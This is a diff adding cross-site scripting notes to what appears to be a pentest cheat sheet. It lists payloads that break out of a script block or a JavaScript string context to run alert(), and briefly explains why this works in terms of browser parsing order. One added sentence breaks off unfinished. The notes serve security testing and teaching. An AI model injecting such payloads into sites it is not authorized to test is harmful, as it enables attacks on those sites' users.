@@ -34,3 +34,16 @@ Example payloads:
 - <link rel="canonical" accesskey="X" onclick="alert(1)" />
 But user is required to press some extra keyboard buttons to trigger the XSS payload.
 
+* If the current attack surface is inside javaScript part of the HTML context, we can still exploit it even if backslashes and single quotes are escaped.
+Example payload:
+-> </script> <img src=x onerror=alert(1)>
+
+The reason this works is that the browser first performs HTML parsing to identify the page elements including blocks of script, and only later performs JavaScript parsing to understand and execute the embedded scripts. The
+
+
+Example payloads when the target context is inside JavaScript part of the HTML ( <script></script>):
+-> '-alert(document.domain)-'
+-> ';alert(document.domain)//
+
+* If single quotes are escaped, backslashes should also be esaceped. Assuming the target context is within the JavaScript part.
+
